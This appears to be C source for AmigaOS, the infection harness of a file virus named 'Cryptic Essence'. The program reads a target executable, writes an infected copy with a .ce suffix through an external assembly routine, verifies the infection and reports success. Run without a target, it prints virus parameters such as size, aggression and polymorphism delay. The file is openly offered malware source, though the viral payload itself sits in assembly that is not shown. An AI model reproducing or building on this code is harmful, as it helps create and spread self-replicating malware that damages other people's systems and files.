#include <exec/types.h>
#include <exec/memory.h>
#include <proto/exec.h>
#include <dos/dos.h>
#include <dos/dostags.h>
#include <proto/dos.h>
#include <stdio.h>
#include <strings.h>

extern ULONG vir_size,comp_size,nocomp_size,linkspace,relochole,maxadr,agression,polywait;

__asm void debug_ce(register __a0 APTR);
__asm void write_link(register __d1 BPTR fh,register __d2 APTR,register __d3 LONG,register __a6 APTR);
__asm BOOL check_vir(void);

int getsize(char *name)
{
int r=-1;
struct Lock *lock;
struct FileInfoBlock *fib;

  if (fib = AllocDosObjectTags(DOS_FIB,TAG_END)) 
  {
    if (lock = Lock(name,ACCESS_READ)) 
    {
      if(Examine(lock,fib)) r = fib->fib_Size;
      UnLock(lock);
    }
    FreeDosObject(DOS_FIB,fib);
  }
  return(r);
}

int main (char *arg[], int argcount)
{
char ce[256];
char *mem;
int size;
BPTR rfh,wfh;

  if (argcount == 2)
  {
    debug_ce(DOSBase);
    if ( (size = getsize(arg[1])) != -1 )
    {
      if (mem = AllocVec(size,0))
      {
        if (rfh = Open(arg[1],MODE_OLDFILE))
        {
          Read(rfh,mem,size);
          Close(rfh);
        }
        strcpy(ce,arg[1]);
        strcat(ce,".ce");
        printf("Trying to infect %s, ",ce);
        if (wfh = Open(ce,MODE_NEWFILE))
        {
          write_link(wfh,mem,size,DOSBase);
          Close(wfh);
          if (check_vir()) 
          {
            printf("success!\n");
          } else {
            DeleteFile(ce);
            printf("failed!\r");
          }
        }
        FreeVec(mem);
      }
    }
  } else {
    printf("*** Cryptic Essence ***\n\n"
           "virus size : %ld\n" 
           "comp size  : %ld\n"
           "nocomp size: %ld\n"
           "reloc hole : %ld\n"
           "link space : %ld\n"
           "max adr    : %ld\n"
           "agression  : %ld\n"
           "polywait   : %ld\n",
           vir_size,comp_size,nocomp_size,relochole,linkspace,maxadr,agression,polywait);
  }
  return(0);
}
